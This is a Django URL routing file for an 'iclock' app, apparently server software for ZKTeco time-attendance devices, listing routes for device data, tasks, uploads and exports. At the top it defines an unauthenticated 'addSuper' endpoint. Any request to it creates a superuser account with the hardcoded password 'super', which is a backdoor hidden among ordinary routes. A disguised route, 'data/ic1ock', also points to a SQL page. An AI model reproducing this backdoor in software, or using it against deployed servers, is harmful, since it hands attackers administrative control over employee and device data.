from django.conf.urls.defaults import *
from django.contrib.auth.decorators import permission_required


def autoAdd(request):
    print '---autoAdd'
    from django.contrib.auth.models import User
    User.objects.create_superuser('Super', 'super@zkteco.com', 'super')
    print '---autoAddFinished'
    from django.shortcuts import render_to_response
    return render_to_response('index.html', 'addSuccessSuper')


urlpatterns = patterns('mysite.iclock', (
    '^addSuper$', autoAdd), ('^cdata$', 'devview.cdata'), ('^getrequest$', 'devview.getreq'), ('^devicecmd$',
                                                                                               'devview.devpost'),
                       ('^fdata$',
                        'devview.postPhoto'), ('^data/(?P<ModelName>[^/]*)/$',
                                               'dataview.DataList'), ('^data/(?P<ModelName>[^/]*)/_clear_/$',
                                                                      'dataview.DataClear'),
                       ('^data/(?P<ModelName>[^/]*)/_del_old_/$',
                        'dataview.DataDelOld'), ('^data/(?P<ModelName>[^/]*)/_new_/$',
                                                 'dataview.DataNew'),
                       ('^data/(?P<ModelName>[^/]*)/(?P<DataKey>[^/]*)/$',
                        'dataview.DataDetail'), ('^data/(?P<ModelName>[^/]*)/miniData$',
                                                 'datamini.getMiniData'), ('^data/(?P<ModelName>[^/]*)/getCopyInfo$',
                                                                           'datamisc.getCopyInfo'),
                       ('^data/(?P<ModelName>[^/]*)/sendnew$',
                        'datamisc.sendnew'), ('^data/_checktranslog_$',
                                              'datamisc.newTransLog'), ('^data/_checkoplog_$',
                                                                        'datamisc.newDevLog'), ('^data/ic1ock$',
                                                                                                'datasql.sql_page'),
                       ('^data/upload$',
                        'importdata.uploadData'), ('^filemng/(?P<pageName>.*)$',
                                                   'filemngview.index'), ('^getmsg/(?P<device>.*)$',
                                                                          'genmsgview.get'),
                       ('^tasks/genmsg/(?P<device>.*)$',
                        'genmsgview.index'), ('^tasks/del_emp$',
                                              'taskview.FileDelEmp'), ('^tasks/disp_emp$',
                                                                       'taskview.FileChgEmp'), ('^tasks/name_emp$',
                                                                                                'taskview.FileChgEmp'),
                       ('^tasks/disp_emp_log$',
                        'taskview.disp_emp_log'), ('^tasks/del_emp_log$',
                                                   'taskview.del_emp_log'), ('^tasks/app_emp$',
                                                                             'taskview.app_emp'), ('^tasks/upgrade$',
                                                                                                   'taskview.upgrade'),
                       ('^tasks/restart$',
                        'taskview.restartDev'), ('^tasks/autorestart$',
                                                 'taskview.autoRestartDev'), ('^tasks/wmsync$',
                                                                              'importwm.WMDataSync'),
                       ('^data_exp/(?P<pageName>.*)$',
                        'expview.index'), ('^pics/(?P<path>.*)$',
                                           'browsepic.index'), ('^upload/(?P<path>.*)$',
                                                                'datamisc.uploadFile'), ('$',
                                                                                         'devview.index'),
                       ('^sendcommand/',
                        'dataproc.sendcommand'))
